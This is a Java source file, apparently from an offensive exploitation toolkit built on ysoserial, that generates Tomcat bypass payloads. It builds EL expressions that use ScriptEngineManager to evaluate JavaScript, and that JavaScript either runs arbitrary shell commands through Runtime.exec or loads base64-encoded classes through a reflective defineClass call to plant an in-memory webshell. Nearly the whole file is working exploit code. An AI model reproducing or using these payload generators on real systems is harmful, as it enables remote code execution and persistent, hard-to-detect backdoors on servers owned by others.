package com.bloom.payload;

import com.bloom.util.Util;
import com.unboundid.util.Base64;
import org.apache.naming.ResourceRef;
import org.apache.wicket.util.file.Files;
import ysoserial.Serializer;

import javax.naming.StringRefAddr;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;

public class TomcatByPass {

    private static String payloadTemplate = "{" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
            ".newInstance().getEngineByName(\"JavaScript\")" +
            ".eval(\"{replacement}\")" +
            "}";

//  String poc = "{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec(" + Functions.makeJavaScriptString(Functions.makeCommand(command)) + ")\")}";



    public String evalPoc(String command) throws ClassNotFoundException, IOException {
        String code="";
        if (command.startsWith("CLASS:")){
            String loadshell="ysoserial.payloads.templates."+command.substring(6);
            try {
                Class clazz=Class.forName(loadshell);
                code=injectMemshell(clazz);
            }catch(ClassNotFoundException e){
                System.out.println("ERROR:无该内存马类型");
            }
        }else if(command.startsWith("FILE:")){
            try {
                File file=new File(command.substring(5));
                byte[] bytes = Files.readBytes(new File(command.substring(5)));
                String result = Util.base64Encode(bytes);
                code=injectMemshell(result,file.getName().substring(0,file.getName().lastIndexOf(".class")));
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }else {
            code=getExecCode(command);
        }
        String finalPayload="";
        if (code!="") {
            finalPayload = payloadTemplate.replace("{replacement}", code);
        }
//        String finalPayload = payloadTemplate.replace("{replacement}", code);
        return finalPayload;
    }


    public static String getExecCode(String cmd) throws IOException {

        String code = "var strs=new Array(3);\n" +
                "        if(java.io.File.separator.equals('/')){\n" +
                "            strs[0]='/bin/bash';\n" +
                "            strs[1]='-c';\n" +
                "            strs[2]='" + cmd + "';\n" +
                "        }else{\n" +
                "            strs[0]='cmd';\n" +
                "            strs[1]='/C';\n" +
                "            strs[2]='" + cmd + "';\n" +
                "        }\n" +
                "        java.lang.Runtime.getRuntime().exec(strs);";

        return code;
    }


    public String injectMemshell(Class clazz){
        //使用类加载的方式最为方便，可维护性也大大增强

        String classCode = null;
        try{
            classCode = Util.getClassCode(clazz);

        }catch(Exception e){
            e.printStackTrace();
        }

        String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "};";

        return code;
    }


    public String injectMemshell(String classCode,String name){
        //使用类加载的方式最为方便，可维护性也大大增强

        String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + name + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "};";

        return code;
    }
}
